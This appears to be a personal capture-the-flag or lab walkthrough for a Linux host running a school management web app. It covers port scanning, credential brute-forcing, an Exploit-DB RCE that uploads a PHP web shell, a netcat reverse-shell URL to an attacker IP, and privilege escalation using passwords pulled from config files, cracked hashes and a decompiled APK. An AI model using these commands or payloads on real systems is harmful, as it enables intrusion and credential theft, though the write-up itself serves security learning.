@@ -1,0 +1,171 @@
+### Enumeration
+```
+IP=192.168.189.13
+sudo nmap -sU $IP
+sudo nmap -p- -vv $IP
+sudo nmap -p22,80 -A $IP
+```
+### Ports 
+- 22
+	- OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+- 80
+	- Apache httpd 2.4.41 ((Ubuntu))
+- OS: Linux
+### Foothold
+- 21
+	- ftp anonymous@$IP
+	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
+- RPC/ SMB
+	- enum4linux -U $IP
+- 445
+	- smbclient -N -L //$IP
+	- nmap --script smb-vuln* -p135,139,445 $IP
+- 3306
+	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://$IP`
+- 80
+	- ![[Pasted image 20240704103934.png]]
+	- Register box
+		- ![[Pasted image 20240704104013.png]]
+		- ![[Pasted image 20240704104225.png]]
+		- Doesn't seem to change anything on webpage
+		- Possible sqli
+	- Contact box
+		- ![[Pasted image 20240704104032.png]]
+		- ![[Pasted image 20240704104124.png]]
+		- Doesn't seem like any response is sent back
+		- Possible sqli
+	- Directory Brute force
+		- dirsearch -u http://$IP
+			- /assets
+			- /management
+				- ![[Pasted image 20240704104442.png]]
+				- Putting single quote says enter valid email
+				- Tried doing burp and adding single quote. Says invalid email or password.
+				- ![[Pasted image 20240704104611.png]]
+				- Maybe sqli
+				- Version gosfem community edition
+				- Google gosfem community edition exploit
+					- Exploit-db
+						- 50587 - RCE
+							- Spent awhile getting the payload to work
+							- ![[Pasted image 20240704115126.png]]
+							- Uploaded in /management/uploads
+							- `http://192.168.189.13/management/uploads/exam_question/cmd1.php?cmd=system(%27id%27);`
+							- returned id
+							- `http://192.168.189.13/management/uploads/exam_question/cmd1.php?cmd=system(%27busybox%20nc%20192.168.45.195%20443%20-e%20/bin/bash%27);`
+							- Gave us RCE
+						- 44727 - SQLi in username
+				- /admin
+					- redirects to /managment
+			- /vendor
+		- dirsearch -u http://$IP/management
+			- /README
+			- /uploads
+				- /assignment/invoice.docx
+					- opened with libreoffice
+						- Yefta Epifania - jepthahcamis@gmail.com
+						- This file is found in 2 other locations
+			- /installation
+				- install_guide.txt
+					- admin@admin.com:1234
+						- did not work
+					- student@student.com:1234
+						- did not work
+					- teacher@teacher.com:1234
+						- did not work
+					- parent@parent.com:1234
+						- did not work
+				- database.sql
+					- phpMyAdmin SQL Dump 4.7.9
+					- sql - Server version: 5.7.21
+					- php - 7.4.21
+					- Users
+						- admin@admin.com:7110eda4d09e062aa5e4a390b0a572ac0d2c0220
+						- udemy@udemy.com:7110eda4d09e062aa5e4a390b0a572ac0d2c0220
+						- parent@parent.com:7110eda4d09e062aa5e4a390b0a572ac0d2c0220
+						- student@student.com:7110eda4d09e062aa5e4a390b0a572ac0d2c0220
+						- teacher@teacher.com:7110eda4d09e062aa5e4a390b0a572ac0d2c0220
+						- 7110eda4d09e062aa5e4a390b0a572ac0d2c0220:1234
+### PE
+#### Linux
+- www-data
+	- id
+		- uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	- sudo -l
+		- requires password
+	- uname -a
+		- `Linux school 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux`
+	- getcap -r / 2>/dev/null
+		- nothing
+	- suid
+		- find / -type f -perm -04000 -ls 2>/dev/null
+			- nothing
+	- linpeas
+		- DNS
+			- localhost and school for 127.0.0.1
+		- Backup
+			- /var/www/html/management/application/config/database.php
+				- school:`@jCma4s8ZM<?kA`  for  db=school_mgment
+	- /home
+		- emiller
+			- ID: uid=1001(emiller) gid=1001(emiller) groups=1001(emiller),27(sudo)
+			- /development
+				- grade-app.apk (staff)
+		- msander
+		- ID: uid=1000(msander) gid=1000(msander) groups=1000(msander),50(staff)
+			- /local.txt
+	- su
+		- emiller
+			- 1234  -  failed
+			- `@jCma4s8ZM<?kA`  -  failed
+		- msander
+			- 1234  -  failed
+			- `@jCma4s8ZM<?kA`  -  failed
+			- greatteacher123 - Success
+		- root
+			- `@jCma4s8ZM<?kA`  - failed
+	- mysql
+		- mysql -u school
+			- `@jCma4s8ZM<?kA`  -  success
+			- Dbs
+				- information_schema
+				- mysql
+				- performance_schema
+				- school_mgment
+					- admin
+						- admin@school.pg:`9be3a2dd3a71f3ccc7cc7eb3a5dd997f`
+							- crackstation - unknown
+					- teacher
+						- michael_sander@school.pg:`3db12170ff3e811db10a76eadd9e9986e3c1a5b7`
+							- crackstation - greatteacher123
+				- sys
+- msander
+	- id
+		- uid=1000(msander) gid=1000(msander) groups=1000(msander),50(staff)
+		- find / -group staff 2>/dev/null
+			- /home/emiller/development/grade-app.apk
+	- sudo -l
+		- can't run sudo
+	- getcap -r / 2>/dev/null
+		- nothing
+	- suid
+		- find / -type f -perm -04000 -ls 2>/dev/null
+			- nothing
+	- linpeas
+		- nothing
+	- Move the grade-app.apk to local machine
+	- jadx-gui
+		- Navigation  >  Text search
+		- emiller  -  nothing
+		- miller  -  1 record  >  double clicked
+		- ![[Pasted image 20240704133952.png]]
+		- e.miller:`EzPwz2022_dev1$$23!!`
+			- su emiller  >  success
+- emiller
+	- id
+		- uid=1001(emiller) gid=1001(emiller) groups=1001(emiller),27(sudo)
+	- sudo su
+		- now we are rooted
+### Credentials
+### Lessons Learned
+- Don't assume you need to be authenticated to run an exploit
